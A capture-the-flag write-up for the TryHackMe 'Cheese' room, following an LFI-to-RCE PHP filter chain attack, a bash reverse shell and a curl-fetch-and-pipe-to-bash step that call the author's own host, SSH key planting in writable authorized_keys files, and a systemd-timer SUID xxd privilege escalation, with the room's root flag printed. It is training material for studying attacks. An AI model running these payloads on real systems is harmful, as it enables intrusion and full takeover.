# Tryhackme: Cheese Challenge 

Room URL: https://tryhackme.com/room/cheesectfv10


## Objective

Hack into the machine and get the flags.

## Enumeration

Start by enumerating the target machine

<img width="1078" height="676" alt="image" src="https://github.com/user-attachments/assets/f6d52b3f-e474-4492-8a12-45b6617bbaa9" />


There are a lot of open ports, and that could be the use of [**Portspoof**](https://www.blackhillsinfosec.com/how-to-use-portspoof-cyber-deception/) tool, this is to make a system appear as if it's running many different services on many different ports. We can see that port 80 is open and it is hosting a `cheese.thm` website page.


<img width="1390" height="835" alt="image" src="https://github.com/user-attachments/assets/16568f7a-771e-4973-ada1-fe5356fb223a" />


I used `dirsearch` to search for hidden pages.


<img width="976" height="744" alt="image" src="https://github.com/user-attachments/assets/2b88e640-9e76-43fe-985f-31b367d24084" />


Checked both `users.html` and `orders.html` and found nothing useful. I tested the login page with default credentials and received the error: `Login failed. Please check your username and password`. Before attempting to brute-force the login page, I tested for XSS and SQLi vulnerabilities. You can use SQLMap to automate this process, you need to intercept the request with Burp Suite and save it, then run `sqlmap -r <login.req>`.


<img width="1302" height="764" alt="image" src="https://github.com/user-attachments/assets/4aac57fd-cf27-4ae1-80c9-cc579dce39a8" />
<img width="1257" height="778" alt="image" src="https://github.com/user-attachments/assets/e95fd416-047b-4cd4-a598-eaf84ba683f3" />

 
We got a redirecting response to this page -> `secret-script.php?file=supersecretadminpanel.html`. We can access this page without logging in.


<img width="1220" height="401" alt="image" src="https://github.com/user-attachments/assets/1f2cb0df-55ab-4a35-8c11-d818e381e26a" />


This is the content of the message: 
<img width="1139" height="194" alt="image" src="https://github.com/user-attachments/assets/9ee7d9ca-bc27-47d3-8777-ddd8d5efb60a" />

Meaning? This is where we will try for **LFI2RCE Via PHP Filter**.

## LFI2RCE Via PHP Filter
 
Here are some examples of [Local File Injection vulnerability:](https://exploit-notes.hdks.org/exploit/web/security-risk/file-inclusion/#local-file-inclusion-(lfi)) 
1. Include another file -> `secret-script.php?file=about.php`
2. Directory Traversal -> `secret-script.php?file=../../etc/passwd`

<img width="997" height="811" alt="image" src="https://github.com/user-attachments/assets/fb9fed89-f8e4-4bec-a386-ad1a72550dfd" />


3. `php://filter `-> and this is our test object. It is a PHP stream wrapper that lets you apply filters to a file stream. We can use this feature to leak the source code

```bash
curl -s http://10.10.76.15/secret-script.php?file=php://filter/convert.base64-encode/resource=secret-script.php | base64 -d
<?php
  //echo "Hello World";
  if(isset($_GET['file'])) {
    $file = $_GET['file'];
    include($file);
  }
?>

```
The script reads the user input from the `file` parameter and includes it. That content is treated as PHP source code and executed. By abusing [`php://filter`](https://www.php.net/manual/en/wrappers.php.php) feature, we can generate a reverse shell without writing to a file. This is done by a script that will generate a base64 string at the beginning, then for each base64 character, it appends a very specific sequence of encodings that eventually decode that character byte-by-byte. The code uses [`php://temp`](https://www.php.net/manual/en/wrappers.php.php), which is a read-write stream that allows temporary data to be stored in a file-like wrapper.

The massive chain is needed because:
- Some character sets discard or transform invalid bytes.
- You need to sanitize/reshape each character of your base64 string.
- You want to trick PHP into outputting valid decoded PHP code at the end.

The final payload: This ends the chain and makes sure the string is converted into something the PHP engine can evaluate.
```py
filters += "convert.base64-decode"
final_payload = f"php://filter/{filters}/resource=php://temp"
```
Immediately `include()` the contents of that stream as if it were a PHP file.
```php
include('php://filter/.../resource=php://temp');
```
For more info -> https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d

First, we need to create a reverse shell file. Replace the listening IP with yours.
```bash
echo "bash -i >& /dev/tcp/10.9.8.180/4444 0>&1" > reverseshell
```

Next, generate a chain of PHP filters that encodes your reverse shell. Source -> [php_filter_chain_generator](https://github.com/synacktiv/php_filter_chain_generator/tree/main)
```bash
python3 php_filter_chain_generator.py --chain '<?= `curl -s -L 10.9.8.180/reverseshell|bash` ?>' | grep '^php' > payload.txt    
```                                                                               
Copy the payload and paste it into the web server. You also need to start a web server that hosts the shell script, and start a listener to receive the reverse connection.

Terminal-1
```bash
python3 -m http.server 80
```
Terminal-2
```bash
nc -lnvp 4444
```

<img width="1314" height="155" alt="image" src="https://github.com/user-attachments/assets/9111d603-cf1b-48e3-b56b-83714c04ef9e" />
<img width="932" height="544" alt="image" src="https://github.com/user-attachments/assets/0810693d-7193-456b-a953-b73d42719866" />


## Initial Access

We finally get our first shell

<img width="806" height="783" alt="image" src="https://github.com/user-attachments/assets/4babcdfc-ec6c-43f1-8763-a5288fb13d03" />

The current user has a write permission to the `authorized_keys` file of the user comte. We can generate our SSH keys and paste our public key into the file.
```bash
www-data@ip-10-10-73-245:/home/comte$ ls -al .ssh
ls -al .ssh
total 8
drwxr-xr-x 2 comte comte 4096 Mar 25  2024 .
drwxr-xr-x 7 comte comte 4096 Apr  4  2024 ..
-rw-rw-rw- 1 comte comte    0 Mar 25  2024 authorized_keys
```

**SSH key generate**
```bash
ssh-keygen -f id_rsa -t rsa
```

Echo your public key to the Comte's `authorized_keys` file
```bash
www-data@ip-10-10-104-81:/home/comte$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDbFMwDXkBuDRNU7YYyFdMV5Y1RmE4oW0aUavzBHtZNTndDXw2lKtt2vKIrs0S..../DcAKfIYMZ1jXJipDF06tExQBZ/I7Sojs= kali@kali" > .ssh/authorized_keys
<F06tExQBZ/I7Sojs= kali@kali" > .ssh/authorized_keys
```

Now SSH to the `comte` machine using your private key
```bash
ssh -i id_rsa comte@10.10.104.81
comte@ip-10-10-104-81:~$ id
uid=1000(comte) gid=1000(comte) groups=1000(comte),24(cdrom),30(dip),46(plugdev)
```

Once we have access to the comte machine, start to search for a way to escalate your privileges
```bash
comte@ip-10-10-73-245:~$ sudo -l
User comte may run the following commands on ip-10-10-73-245:
    (ALL) NOPASSWD: /bin/systemctl daemon-reload
    (ALL) NOPASSWD: /bin/systemctl restart exploit.timer
    (ALL) NOPASSWD: /bin/systemctl start exploit.timer
    (ALL) NOPASSWD: /bin/systemctl enable exploit.timer
```
```bash
comte@ip-10-10-73-245:~$ find / -name  exploit.timer 2>/dev/null
/etc/systemd/system/exploit.timer
comte@ip-10-10-104-81:~$ ls -l /etc/systemd/system/exploit.*
-rw-r--r-- 1 root root 141 Mar 29  2024 /etc/systemd/system/exploit.service                                                                    
-rwxrwxrwx 1 root root  87 Mar 29  2024 /etc/systemd/system/exploit.timer   
comte@ip-10-10-73-245:~$ cat /etc/systemd/system/exploit.timer
[Unit]
Description=Exploit Timer

[Timer]
OnBootSec=

[Install]
WantedBy=timers.target
comte@ip-10-10-73-245:~$ cat /etc/systemd/system/exploit.service
[Unit]
Description=Exploit Service

[Service]
Type=oneshot
ExecStart=/bin/bash -c "/bin/cp /usr/bin/xxd /opt/xxd && /bin/chmod +sx /opt/xxd"
```

As we can see, there is a timer in the machine that, once started, will copy the `xxd` binary to the `/opt` folder and change its permission to allow a non-root user to execute it.

```bash
comte@ip-10-10-73-245:~$ sudo /bin/systemctl daemon-reload
comte@ip-10-10-73-245:~$ sudo /bin/systemctl start exploit.timer
Failed to start exploit.timer: Unit exploit.timer has a bad unit file setting.
See system logs and 'systemctl status exploit.timer' for details.
comte@ip-10-10-73-245:~$ systemctl status exploit.timer
● exploit.timer - Exploit Timer
     Loaded: bad-setting (Reason: Unit exploit.timer has a bad unit file setting.)
     Active: inactive (dead)
    Trigger: n/a
   Triggers: ● exploit.service
comte@ip-10-10-73-245:~$ 
```

The error occurred due to an invalid time value in the `OnBootSec=`. Fix it by adding a valid duration like `10s` or `1min`

<img width="586" height="231" alt="image" src="https://github.com/user-attachments/assets/42234523-15b1-4e9c-9698-a4b098149d81" />

Now restart it, and check the status.
```bash
comte@ip-10-10-73-245:~$ sudo /bin/systemctl daemon-reload
comte@ip-10-10-73-245:~$ sudo /bin/systemctl start exploit.timer
comte@ip-10-10-73-245:~$ systemctl status exploit.timer
● exploit.timer - Exploit Timer
     Loaded: loaded (/etc/systemd/system/exploit.timer; disabled; vendor preset: enabled)
     Active: active (elapsed) since Sun 2025-07-20 22:09:05 UTC; 13s ago
    Trigger: n/a
   Triggers: ● exploit.service
```

Once it's active, the Exploit Service file will paste `xxd` onto the `/opt` folder. 
```bash
comte@ip-10-10-73-245:~$ ls -al /opt
total 28
drwxr-xr-x  2 root root  4096 Jul 20 22:09 .
drwxr-xr-x 19 root root  4096 Jul 20 21:01 ..
-rwsr-sr-x  1 root root 18712 Jul 20 22:09 xxd
```

## Privilege Escalation

We can abuse `xxd` for both file reading and writing. source -> https://gtfobins.github.io/gtfobins/xxd/#suid
```bash
omte@ip-10-10-73-245:/opt$ LFILE=/root/root.txt
comte@ip-10-10-73-245:/opt$ ./xxd "$LFILE" | xxd -r
      _                           _       _ _  __
  ___| |__   ___  ___  ___  ___  (_)___  | (_)/ _| ___
 / __| '_ \ / _ \/ _ \/ __|/ _ \ | / __| | | | |_ / _ \
| (__| | | |  __/  __/\__ \  __/ | \__ \ | | |  _|  __/
 \___|_| |_|\___|\___||___/\___| |_|___/ |_|_|_|  \___|


THM{dca75486094810807faf4b7b0a929b11e5e0167c}
```

Just as we did with the comte user, we will use `xxd` to write our public key to the `authorized_keys` file of the root user
```bash
comte@ip-10-10-73-245:/$ LFILE=/root/.ssh/authorized_keys
comte@ip-10-10-73-245:/$ echo "ssh-rsa AAA....ncLYVjnDGv7a6G1lLIWKjWwN+ED8= kali@kali" | /opt/xxd | /opt/xxd -r - "$LFILE"
```

Now exit and log in again as the **Root user**

<img width="1062" height="813" alt="image" src="https://github.com/user-attachments/assets/07ba9162-49a8-4cd9-bdc1-4bb442064e4d" />


Done!. 

## References:

- *https://github.com/synacktiv/php_filter_chain_generator/tree/main*
- *https://gtfobins.github.io/gtfobins/xxd/#suid*
- *https://www.php.net/manual/en/wrappers.php.php*
- *https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d*
- *https://github.com/synacktiv/php_filter_chain_generator/tree/main*
- *https://exploit-notes.hdks.org/exploit/web/security-risk/file-inclusion/#local-file-inclusion-(lfi)*
- *https://www.blackhillsinfosec.com/how-to-use-portspoof-cyber-deception/*
